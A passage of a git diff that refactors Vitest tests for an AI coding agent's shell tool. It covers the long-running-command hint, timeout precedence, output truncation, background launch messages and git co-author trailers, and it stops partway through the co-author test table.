       it('omits the hint on the timeout path (combinedSignal aborted, signal not)', async () => {
-        // The plain `aborted: true` resolution above exercises the user-
-        // cancel branch (`combinedSignal.aborted && signal.aborted`).
-        // The TIMEOUT branch (`combinedSignal.aborted && !signal.aborted`)
-        // needs an `AbortSignal.any` mock that returns an already-aborted
-        // combined signal — same pattern as `should handle timeout vs
-        // user cancellation correctly` further down. Pinning the timeout
-        // branch separately so a future regression that flips the
-        // suppression check (e.g. `!result.aborted` → `!combinedSignal.aborted`)
-        // would fail loudly on this case.
+        // `aborted: true` above is the user-cancel branch. The TIMEOUT branch
+        // (`combinedSignal.aborted && !signal.aborted`) needs an aborted
+        // combined signal, pinned so flipping the suppression check
+        // (`!result.aborted` → `!combinedSignal.aborted`) fails loudly.
         const userAbort = new AbortController();
-        const mockTimeoutSignal = {
-          aborted: false,
-          addEventListener: vi.fn(),
-          removeEventListener: vi.fn(),
-        } as unknown as AbortSignal;
-        const mockCombinedSignal = {
+        stubAbortSignal(fakeSignal(false), timedOutSignal());
+
+        const promise = build('tail -f /tmp/never.log', {
+          timeout: 60_000,
+        }).execute(userAbort.signal);
+        await vi.advanceTimersByTimeAsync(60_000);
+        resolveShellExecution({
+          output: 'partial',
+          exitCode: null,
           aborted: true,
-          reason: new DOMException('timed out', 'TimeoutError'),
-          addEventListener: vi.fn(),
-          removeEventListener: vi.fn(),
-        } as unknown as AbortSignal;
-        const originalAbortSignal = globalThis.AbortSignal;
-        vi.stubGlobal('AbortSignal', {
-          ...originalAbortSignal,
-          timeout: vi.fn().mockReturnValue(mockTimeoutSignal),
-          any: vi.fn().mockReturnValue(mockCombinedSignal),
         });
+        const result = await promise;
 
-        try {
-          const invocation = shellTool.build({
-            command: 'tail -f /tmp/never.log',
-            is_background: false,
-            timeout: 60_000,
-          });
-          const promise = invocation.execute(userAbort.signal);
-          await vi.advanceTimersByTimeAsync(60_000);
-          resolveShellExecution({
-            output: 'partial',
-            exitCode: null,
-            aborted: true,
-          });
-          const result = await promise;
-
-          expect(result.llmContent).toContain(
-            'Command timed out after 60000ms',
-          );
-          expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
-          expect(result.llmContent).not.toContain('foreground command ran for');
-        } finally {
-          // Restore even if assertions throw, otherwise globalThis.AbortSignal
-          // stays patched and cascades into unrelated subsequent tests.
-          vi.stubGlobal('AbortSignal', originalAbortSignal);
-        }
+        expect(result.llmContent).toContain('Command timed out after 60000ms');
+        expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
+        expect(result.llmContent).not.toContain(HINT);
       });
 
       it('omits the hint when the process was killed by an external signal (SIGTERM / OOM / etc.)', async () => {
-        // External signals (`result.signal != null`) with `aborted: false`:
-        // `shellExecutionService` only sets `aborted` when the AbortSignal
-        // we passed was triggered, so SIGTERM from container shutdown,
-        // k8s eviction, OOM killer, or a sibling reaping the process group
-        // falls through to the non-aborted branch. The advisory shouldn't
-        // fire there either — the process didn't run to its conclusion,
-        // so "next time, background it" doesn't apply.
-        const invocation = shellTool.build({
-          command: 'tail -f /tmp/never.log',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(75_000);
-        // SIGTERM = 15; ShellExecutionResult stores the numeric signal
-        // code (see `signal: number | null` in shellExecutionService.ts
-        // and the `os.constants.signals[signal]` lookup at the spawn
-        // settle path).
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: 15,
-          aborted: false,
-        });
-        const result = await promise;
+        // `aborted` is set only when our AbortSignal fired, so SIGTERM from
+        // container shutdown, k8s eviction, the OOM killer or a sibling reaping
+        // the group is non-aborted; the process didn't finish, so "background
+        // it next time" doesn't apply. (Numeric signal code: SIGTERM = 15.)
+        const result = await runFor(
+          75_000,
+          'tail -f /tmp/never.log',
+          SIGTERMED,
+        );
         // Falls through to the normal result formatter (non-aborted).
-        expect(result.llmContent).toContain('Signal: 15');
-        expect(result.llmContent).not.toContain('foreground command ran for');
+        expectText(result.llmContent, ['Signal: 15'], [HINT]);
       });
 
       it('appends the hint when PTY reports a clean exit with signal 0', async () => {
-        const invocation = shellTool.build({
-          command: 'echo hi',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(60_000);
-        resolveShellExecution({
+        const result = await runFor(60_000, 'echo hi', {
           output: 'hi',
           exitCode: 0,
           signal: 0,
-          aborted: false,
         });
-        const result = await promise;
-        expect(result.llmContent).toContain('foreground command ran for 60s');
+        expectHintShown(result);
       });
 
       it('off-by-one: omits the hint at threshold − 1ms', async () => {
-        // Pin the boundary so a regression that flips `>=` to `>` would
-        // fail loudly. Pairs with the existing 60_000ms-exactly test
-        // (which fires) — these two together pin the boundary tightly.
-        const invocation = shellTool.build({
-          command: 'echo hi',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(59_999);
-        resolveShellExecution({ output: 'hi', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).not.toContain('foreground command ran for');
+        // With the 60_000ms case (which fires) this pins the boundary, so
+        // flipping `>=` to `>` fails loudly.
+        const result = await runFor(59_999, 'echo hi', 'hi');
+        expect(result.llmContent).not.toContain(HINT);
       });
 
       it('appends the hint AFTER truncation (so it survives `truncateToolOutput`)', async () => {
-        // `truncateToolOutput` wraps over-budget output in a "Truncated
-        // part of the output:" envelope. If the hint were appended
-        // inside that envelope (i.e. before truncation), the LLM might
-        // read the advisory as part of the command's own output. Pin
-        // the post-truncation insertion order: the hint must appear
-        // outside the truncation marker.
-        //
-        // Mock `truncateToolOutput` directly rather than driving real
-        // truncation — the real path needs `fs.writeFile` to actually
-        // succeed (the catch fallback returns no `outputFile`, so the
-        // shell.ts replacement branch never fires). Mocking here pins
-        // ordering, which is all this test cares about.
-        const truncationModule = await import('./truncation.js');
-        const spy = vi
-          .spyOn(truncationModule, 'truncateToolOutput')
-          .mockResolvedValue({
-            content:
-              'Tool output was too large and has been truncated.\n[mocked truncated body]',
-            outputFile: '/tmp/qwen-temp/shell_mocked.output',
-          });
+        // Inside the "Truncated part of the output:" envelope the advisory
+        // could read as command output. truncateToolOutput is mocked: real
+        // truncation needs a working `fs.writeFile` (the fallback returns no
+        // `outputFile`, so the replacement never fires); only ordering matters.
+        await spyTruncation({
+          content:
+            'Tool output was too large and has been truncated.\n[mocked truncated body]',
+          outputFile: '/tmp/qwen-temp/shell_mocked.output',
+        });
 
-        try {
-          const invocation = shellTool.build({
-            command: 'long-output-cmd',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          await vi.advanceTimersByTimeAsync(60_000);
-          resolveShellExecution({ output: 'A'.repeat(500), exitCode: 0 });
-          const result = await promise;
+        const result = await runFor(60_000, 'long-output-cmd', 'A'.repeat(500));
 
-          const content = result.llmContent as string;
-          // Hint present.
-          expect(content).toContain('foreground command ran for 60s');
-          // Truncation envelope present (proves the truncation branch
-          // actually ran in shell.ts — `outputFile` was set so the
-          // replacement happened).
-          expect(content).toContain(
-            'Tool output was too large and has been truncated.',
-          );
-          // Hint comes AFTER the truncation marker — pins the
-          // post-truncation insertion order so a regression that
-          // moves the append back inside the non-aborted llmContent
-          // builder (where it'd get wrapped by the truncation
-          // envelope on long output) would fail loudly.
-          const truncIdx = content.indexOf(
-            'Tool output was too large and has been truncated.',
-          );
-          const hintIdx = content.indexOf('foreground command ran for');
-          expect(hintIdx).toBeGreaterThan(truncIdx);
-          expect(result.persistedOutputFiles).toEqual([
-            '/tmp/qwen-temp/shell_mocked.output',
-          ]);
-        } finally {
-          // Restore even if assertions throw — otherwise the
-          // truncateToolOutput spy leaks into subsequent tests.
-          spy.mockRestore();
-        }
+        const content = result.llmContent as string;
+        const TRUNCATION = 'Tool output was too large and has been truncated.';
+        // The envelope proves shell.ts's replacement ran (`outputFile` set).
+        expectText(content, [`${HINT} 60s`, TRUNCATION]);
+        // Hint AFTER the marker: moving the append back into the non-aborted
+        // llmContent builder (wrapped by the envelope) fails here.
+        expect(content.indexOf(HINT)).toBeGreaterThan(
+          content.indexOf(TRUNCATION),
+        );
+        expect(result.persistedOutputFiles).toEqual([
+          '/tmp/qwen-temp/shell_mocked.output',
+        ]);
       });
 
       it('truncates shell output char-only so the line cap cannot undercut the char budget', async () => {
-        // Regression (C2): the in-tool truncateToolOutput call omitted `lines`,
-        // so it fell back to the config line cap (default 1000). Many-short-line
-        // output (find /, ls -R) then got line-truncated while the 30k char
-        // budget still had room — contradicting the per-tool char-only contract.
-        // Pin that shell declares lines: Infinity.
-        const truncationModule = await import('./truncation.js');
-        const spy = vi
-          .spyOn(truncationModule, 'truncateToolOutput')
-          .mockImplementation(async (_config, _toolName, content) => ({
-            content,
-            outputFile: undefined,
-          }));
-        try {
-          const invocation = shellTool.build({
-            command: 'find /',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          await vi.advanceTimersByTimeAsync(1_000);
-          resolveShellExecution({
-            output: 'short line\n'.repeat(50),
-            exitCode: 0,
-          });
-          const result = await promise;
+        // Regression (C2): omitting `lines` fell back to the config line cap
+        // (1000), line-truncating many-short-line output (find /, ls -R) within
+        // the 30k budget, against the char-only contract: pass lines: Infinity.
+        const spy = await spyTruncation();
+        const result = await runFor(1_000, 'find /', 'short line\n'.repeat(50));
 
-          // Shell must pass lines: Infinity so the global line cap can't
-          // undercut its effective Shell char budget.
-          expect(spy).toHaveBeenCalledWith(
-            expect.anything(),
-            ShellTool.Name,
-            expect.any(String),
-            expect.objectContaining({
-              lines: Number.POSITIVE_INFINITY,
-              previewChars: 4000,
-            }),
-          );
-          expect(result.persistedOutputFiles).toBeUndefined();
-        } finally {
-          spy.mockRestore();
-        }
+        expect(spy).toHaveBeenCalledWith(
+          expect.anything(),
+          ShellTool.Name,
+          expect.any(String),
+          expect.objectContaining({
+            lines: Number.POSITIVE_INFINITY,
+            previewChars: 4000,
+          }),
+        );
+        expect(result.persistedOutputFiles).toBeUndefined();
       });
 
       it('threshold scales with the user-supplied timeout (not the default)', async () => {
-        // User explicitly sets timeout: 600_000 (10 min) because they
-        // expect a long command. Threshold is half that, so a 100s
-        // run should NOT trigger the advisory — the user already told
-        // us this command is allowed to run long. Pins the per-
-        // invocation coupling so a regression that goes back to the
-        // fixed `LONG_RUNNING_FOREGROUND_THRESHOLD_MS` constant
-        // would fail this test.
-        const invocation = shellTool.build({
-          command: 'pytest --slow',
-          is_background: false,
+        // An explicit 10-min timeout says the command may run long: the
+        // threshold is half (300s), so 100s must NOT fire. Going back to the
+        // fixed `LONG_RUNNING_FOREGROUND_THRESHOLD_MS` fails this.
+        const result = await runFor(100_000, 'pytest --slow', 'all green', {
           timeout: 600_000,
         });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(100_000); // 100s, well under threshold (300s)
-        resolveShellExecution({ output: 'all green', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).not.toContain('foreground command ran for');
+        expect(result.llmContent).not.toContain(HINT);
       });
 
       describe('foreground timeout resolution (issue #5838)', () => {
-        // Precedence: per-call `timeout` param > `tools.shell.defaultTimeoutMs`
-        // setting > built-in DEFAULT_FOREGROUND_TIMEOUT_MS (120000). The
-        // resolved value is what `AbortSignal.timeout(...)` is armed with, so
-        // spying on that call pins the chosen timeout without waiting for it
-        // to fire.
+        // Precedence: per-call `timeout` > `tools.shell.defaultTimeoutMs` >
+        // DEFAULT_FOREGROUND_TIMEOUT_MS (120000). Spying on the
+        // `AbortSignal.timeout(...)` it arms pins the choice without waiting.
         const timeoutCfg = () =>
           mockConfig as unknown as { getShellDefaultTimeoutMs: Mock };
 
-        it('uses the per-call timeout param over the configured default', async () => {
-          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(300_000);
-          const timeoutSpy = vi.spyOn(AbortSignal, 'timeout');
-          try {
-            const invocation = shellTool.build({
-              command: 'echo hi',
-              is_background: false,
-              timeout: 60_000,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            resolveShellExecution({ output: 'hi', exitCode: 0 });
-            await promise;
-            expect(timeoutSpy).toHaveBeenCalledWith(60_000);
-          } finally {
-            timeoutSpy.mockRestore();
-          }
-        });
+        /** Spies on AbortSignal.timeout until this test finishes. */
+        const spyTimeout = () => {
+          const spy = vi.spyOn(AbortSignal, 'timeout');
+          onTestFinished(() => {
+            spy.mockRestore();
+          });
+          return spy;
+        };
 
-        it('falls back to the configured default when no per-call timeout is given', async () => {
-          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(300_000);
-          const timeoutSpy = vi.spyOn(AbortSignal, 'timeout');
-          try {
-            const invocation = shellTool.build({
-              command: 'echo hi',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            resolveShellExecution({ output: 'hi', exitCode: 0 });
-            await promise;
-            expect(timeoutSpy).toHaveBeenCalledWith(300_000);
-          } finally {
-            timeoutSpy.mockRestore();
-          }
-        });
-
-        it('falls back to the built-in default when neither param nor setting is present', async () => {
-          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(undefined);
-          const timeoutSpy = vi.spyOn(AbortSignal, 'timeout');
-          try {
-            const invocation = shellTool.build({
-              command: 'echo hi',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            resolveShellExecution({ output: 'hi', exitCode: 0 });
-            await promise;
+        it.each<[string, number | undefined, Partial<ShellToolParams>, number]>(
+          [
+            [
+              'uses the per-call timeout param over the configured default',
+              300_000,
+              { timeout: 60_000 },
+              60_000,
+            ],
+            [
+              'falls back to the configured default when no per-call timeout is given',
+              300_000,
+              {},
+              300_000,
+            ],
             // DEFAULT_FOREGROUND_TIMEOUT_MS
-            expect(timeoutSpy).toHaveBeenCalledWith(120_000);
-          } finally {
-            timeoutSpy.mockRestore();
-          }
+            [
+              'falls back to the built-in default when neither param nor setting is present',
+              undefined,
+              {},
+              120_000,
+            ],
+          ],
+        )('%s', async (_title, configured, params, expected) => {
+          timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(configured);
+          const timeoutSpy = spyTimeout();
+          await runFg('echo hi', { output: 'hi', exitCode: 0 }, params);
+          expect(timeoutSpy).toHaveBeenCalledWith(expected);
         });
 
         it('disables the timeout when the configured default is 0', async () => {
           timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(0);
-          const timeoutSpy = vi.spyOn(AbortSignal, 'timeout');
-          try {
-            const invocation = shellTool.build({
-              command: 'echo hi',
-              is_background: false,
-            });
-            const promise = invocation.execute(mockAbortSignal);
-            resolveShellExecution({ output: 'hi', exitCode: 0 });
-            await promise;
-            // effectiveTimeout === 0 is falsy, so no timeout signal is armed.
-            expect(timeoutSpy).not.toHaveBeenCalled();
-          } finally {
-            timeoutSpy.mockRestore();
-          }
+          const timeoutSpy = spyTimeout();
+          await runFg('echo hi', { output: 'hi', exitCode: 0 });
+          // effectiveTimeout === 0 is falsy, so no timeout signal is armed.
+          expect(timeoutSpy).not.toHaveBeenCalled();
         });
 
         it('does not emit the spurious long-run hint when the timeout is disabled (0)', async () => {
-          // Regression guard: with the timeout disabled there is no
-          // "half the timeout" threshold. `longRunThresholdFor(0)` would
-          // return its 1000ms floor and fire the auto-bg hint on every
-          // foreground command running longer than ~1s. The disabled case
-          // must suppress the hint entirely.
+          // Regression: with no "half the timeout", `longRunThresholdFor(0)`
+          // returned its 1000ms floor and hinted on every command over ~1s.
           timeoutCfg().getShellDefaultTimeoutMs.mockReturnValue(0);
-          const invocation = shellTool.build({
-            command: 'dev-server.sh',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
           // Well past the 1000ms floor that would otherwise trip the hint.
-          await vi.advanceTimersByTimeAsync(120_000);
-          resolveShellExecution({ output: 'listening', exitCode: 0 });
-          const result = await promise;
-          expect(result.llmContent).not.toContain('foreground command ran for');
-          expect(result.llmContent).not.toContain('is_background: true');
+          const result = await runFor(120_000, 'dev-server.sh', 'listening');
+          expectText(result.llmContent, [], [HINT, 'is_background: true']);
         });
       });
 
       it('threshold-scaling positive case: hint DOES fire at the scaled threshold', async () => {
-        // Pair with the negative test above. If `longRunThresholdFor`
-        // regressed to a fixed 60s, the negative test would still pass
-        // (no hint at 100s under default threshold either) but THIS
-        // one would also fire incorrectly at 100s — pinning both ends
-        // catches the failure mode.
-        const invocation = shellTool.build({
-          command: 'pytest --slow',
-          is_background: false,
+        // Pairs with the negative case: a fixed 60s threshold would pass that
+        // one too (no hint at 100s either way), but fails here. Past the 300s
+        // scaled threshold.
+        const result = await runFor(305_000, 'pytest --slow', 'all green', {
           timeout: 600_000,
         });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(305_000); // past 300s scaled threshold
-        resolveShellExecution({ output: 'all green', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).toContain('foreground command ran for 305s');
+        expect(result.llmContent).toContain(`${HINT} 305s`);
       });
 
       it('hint appears in non-debug returnDisplay (user TUI)', async () => {
-        // The hint is useful to the user too — they're the one waiting
-        // for long commands. Pin that the non-debug TUI gets the hint
-        // appended (terse form: result.output + hint, separated by
-        // blank line). Default `getDebugMode → false`.
-        const invocation = shellTool.build({
-          command: 'pytest -q',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(60_000);
-        resolveShellExecution({ output: 'all green', exitCode: 0 });
-        const result = await promise;
-        // Both surfaces have the hint.
-        expect(result.llmContent).toContain('foreground command ran for 60s');
-        expect(result.returnDisplay).toContain(
-          'foreground command ran for 60s',
-        );
-        // Original output preserved (not replaced by hint).
-        expect(result.returnDisplay).toContain('all green');
+        // The user waits for long commands too: the non-debug TUI (default
+        // `getDebugMode → false`) gets output + blank line + hint.
+        const result = await runFor(60_000, 'pytest -q', 'all green');
+        expectHintShown(result);
+        // The original output is preserved, not replaced by the hint.
+        expectText(shellResultText(result.returnDisplay), [
+          `${HINT} 60s`,
+          'all green',
+        ]);
       });
 
       it('hint also appears in debug-mode returnDisplay (mirrors LLM view)', async () => {
-        // Same hint visibility but through the debug-mode mirror code
-        // path. Both branches now use append-style re-sync (preserving
-        // any prior content like the truncation marker), so the
-        // assertion is the same — but exercising both flips guards
-        // the branch from regressing independently.
-        const debugMock = mockConfig as unknown as { getDebugMode: Mock };
-        debugMock.getDebugMode.mockReturnValue(true);
-        try {
-          const invocation = shellTool.build({
-            command: 'pytest -q',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          await vi.advanceTimersByTimeAsync(60_000);
-          resolveShellExecution({ output: 'all green', exitCode: 0 });
-          const result = await promise;
-          expect(result.llmContent).toContain('foreground command ran for 60s');
-          expect(result.returnDisplay).toContain(
-            'foreground command ran for 60s',
-          );
-        } finally {
-          debugMock.getDebugMode.mockReturnValue(false);
-        }
+        // Same assertion through the debug-mode mirror: both branches re-sync
+        // append-style (keeping e.g. the truncation marker), and exercising
+        // both guards each from regressing independently.
+        (mockConfig.getDebugMode as Mock).mockReturnValue(true);
+        const result = await runFor(60_000, 'pytest -q', 'all green');
+        expectHintShown(result);
+        expect(shellResultText(result.returnDisplay)).toContain(`${HINT} 60s`);
       });
 
       it('honors the MIN_LONG_RUN_THRESHOLD_MS floor for pathological tiny timeouts', async () => {
-        // `longRunThresholdFor(1)` would otherwise be `Math.floor(0.5) = 0`,
-        // making `elapsedMs >= 0` true on every invocation and emitting
-        // a "ran for 0s" advisory. The floor at MIN_LONG_RUN_THRESHOLD_MS
-        // (1000ms) keeps the threshold sensible. This test pins it: a
-        // 500ms run with `timeout: 1` finishes BELOW the floor and must
-        // NOT trigger the hint. (The result is mocked with `aborted: false`
-        // since we're isolating the threshold logic from the abort path —
-        // a regression that strips the `Math.max(...)` guard would fire
-        // the hint here while the real-world abort path stays intact.)
-        const invocation = shellTool.build({
-          command: 'echo done',
-          is_background: false,
-          timeout: 1,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(500);
-        resolveShellExecution({ output: 'done', exitCode: 0 });
-        const result = await promise;
-        expect(result.llmContent).not.toContain('foreground command ran for');
+        // `longRunThresholdFor(1)` would be `Math.floor(0.5) = 0`, hinting
+        // "ran for 0s" on every run; the 1000ms floor prevents it. A 500ms run
+        // with `timeout: 1` (mocked `aborted: false` to isolate the threshold
+        // from the abort path) must NOT hint if the `Math.max(...)` guard holds.
+        const result = await runFor(500, 'echo done', 'done', { timeout: 1 });
+        expect(result.llmContent).not.toContain(HINT);
       });
 
       it('hint survives the error path (appended to error.message)', async () => {
-        // `coreToolScheduler` builds the model-facing functionResponse
-        // from `error.message` (NOT llmContent) when toolResult.error
-        // is set. So if a long command fails AND hits the spawn-error
-        // path, the hint we appended to llmContent would be silently
-        // dropped before reaching the agent. Pin that the hint also
-        // lives in error.message.
-        //
-        // Note on realism: `ShellExecutionResult.error` is reserved for
-        // spawn / setup failures (per the field's doc comment in
-        // shellExecutionService.ts) — non-zero exits leave it null.
-        // Real spawn failures (ENOENT, permission denied) typically
-        // resolve in <1s, so the long-elapsed + spawn-error combination
-        // tested here is rare in practice. The test still pins the
-        // CODE PATH because slow spawn paths exist (PTY init dragging,
-        // remote-fs exec syscalls, security scanners interposing) and
-        // a future regression that drops the error-path hint
-        // preservation would silently break those edge cases.
-        const slowSpawnError = new Error('PTY initialization failed after 75s');
-        const invocation = shellTool.build({
-          command: 'cmd-that-fails-to-spawn',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        await vi.advanceTimersByTimeAsync(75_000);
-        resolveShellExecution({
+        // `coreToolScheduler` builds the functionResponse from `error.message`
+        // (not llmContent) when an error is set, so the hint must be there too.
+        // Spawn/setup errors are rarely slow, but slow spawn paths exist (PTY
+        // init, remote-fs exec, interposing security scanners).
+        const result = await runFor(75_000, 'cmd-that-fails-to-spawn', {
           output: '',
           exitCode: null, // spawn never produced an exit code
-          error: slowSpawnError,
+          error: new Error('PTY initialization failed after 75s'),
         });
-        const result = await promise;
-        // The hint must appear in the error.message path so the LLM
-        // sees it via the scheduler's error branch.
-        expect(result.error?.message).toContain(
+        expectText(result.error?.message, [
           'PTY initialization failed after 75s',
-        );
-        expect(result.error?.message).toContain(
-          'foreground command ran for 75s',
-        );
-        // `\n---\n` divider so downstream consumers
-        // (firePostToolUseFailureHook, telemetry grouping, SIEM, hook
-        // parsers) have an unambiguous boundary between the original
-        // error body and the appended advisory. Without the divider,
-        // pattern-matching on error messages would absorb the ~400-
-        // char advisory into the matched body.
+          `${HINT} 75s`,
+        ]);
+        // A `\n---\n` divider gives consumers (firePostToolUseFailureHook,
+        // telemetry grouping, SIEM, hook parsers) an unambiguous boundary, so
+        // error matching doesn't absorb the ~400-char advisory.
         expect(result.error?.message).toMatch(
           /PTY initialization failed after 75s\n\n---\n/,
         );
       });
 
       it('never appends the long-run hint on background commands', async () => {
-        // Background path returns immediately with `Background shell
-        // started.` and a different result shape — by construction the
-        // hint logic only lives in `executeForeground`, so this can't
-        // fail today. Defensive pin: a future refactor that hoists the
-        // long-run advisory into a shared post-execute path would
-        // accidentally tag every background launch with a "ran for 0s,
-        // consider is_background: true" suggestion (nonsense — it's
-        // already backgrounded). This test fails loudly on that
-        // regression.
-        const invocation = shellTool.build({
-          command: 'pytest -q',
-          is_background: true,
-        });
-        const result = await invocation.execute(mockAbortSignal);
-        expect(result.llmContent).toContain('Background shell started');
-        expect(result.llmContent).not.toContain('foreground command ran for');
-        // The hint text contains the literal `is_background: true` —
-        // the background path's own llmContent doesn't, so this guards
-        // against the hint leaking in via a shared code path.
-        expect(result.llmContent).not.toContain('is_background: true');
+        // The hint lives only in `executeForeground`; hoisting it into a shared
+        // post-execute path would tag every background launch "ran for 0s,
+        // consider is_background: true". Its literal `is_background: true` is
+        // absent from the background copy, which catches such a leak.
+        const result = await runBg('pytest -q');
+        expectText(
+          result.llmContent,
+          ['Background shell started'],
+          [HINT, 'is_background: true'],
+        );
       });
 
       it('teaches status-file liveness checking in the launch message', async () => {
-        // #7626: with only "read the output file" guidance, the model's
-        // sole liveness heuristic becomes "empty file = dead process" —
-        // wrong for block-buffering children (Python/ML jobs) whose
-        // output file stays at 0 bytes for their whole run, which led
-        // to duplicate relaunches of still-running processes.
-        const invocation = shellTool.build({
-          command: 'python train.py',
-          is_background: true,
-        });
-        const result = await invocation.execute(mockAbortSignal);
+        // #7626: with only "read the output file" guidance, the model's sole
+        // liveness heuristic became "empty file = dead process", wrong for
+        // block-buffering children (Python/ML jobs) whose file stays at 0
+        // bytes, which led to duplicate relaunches of running processes.
+        const result = await runBg('python train.py');
         const text = String(result.llmContent);
         expect(text).toContain('status file: ');
         expect(text).toMatch(/status file: .*shell-bg_[0-9a-f]+\.status/);
-        expect(text).toContain('Do NOT infer liveness from the output file');
-        expect(text).toContain('block-buffer');
-        expect(text).toContain('python -u');
+        expectText(text, [
+          'Do NOT infer liveness from the output file',
+          'block-buffer',
+          'python -u',
+        ]);
       });
     });
 
     describe('addCoAuthorToGitCommit', () => {
-      it('should add co-author to git commit with double quotes', async () => {
-        const command = 'git commit -m "Initial commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
+      const QWEN_TRAILER = expect.stringContaining(
+        'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
+      );
+      const TRAILER = expect.stringContaining('Co-authored-by:');
+      const NO_TRAILER = expect.not.stringContaining('Co-authored-by:');
 
-        // Mock the shell execution to return success
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
+      it.each<[string, string, unknown]>([
+        ...rowsOf(QWEN_TRAILER, {
+          'should add co-author to git commit with double quotes':
+            'git commit -m "Initial commit"',
+          'should add co-author to git commit with single quotes':
+            "git commit -m 'Fix bug'",
+          'should handle git commit with additional flags':
+            'git commit -a -m "Add feature"',
+          'should handle git commit with combined short flags like -am':
+            'git commit -am "Add feature"',
+          'should handle git commit with escaped quotes in message':
+            'git commit -m "Fix \\"quoted\\" text"',
+          'should add co-author to git commit with multi-line message': `git commit -m "Fix bug
 
-        await promise;
-
-        // Verify that the command was executed with co-author added
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should add co-author to git commit with single quotes', async () => {
-        const command = "git commit -m 'Fix bug'";
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should handle git commit with additional flags', async () => {
-        const command = 'git commit -a -m "Add feature"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should handle git commit with combined short flags like -am', async () => {
-        const command = 'git commit -am "Add feature"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should not modify non-git commands', async () => {
-        const command = 'npm install';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
+ This is a detailed description
+ spanning multiple lines"`,
+          // Bash accepts `-mfoo`; the old regex required whitespace after `-m`
+          // and silently skipped `git commit -m"msg"`.
+          'should add co-author to git commit -m"msg" shorthand (no space)':
+            'git commit -m"Quick fix"',
+        }),
+        [
+          'should not modify non-git commands',
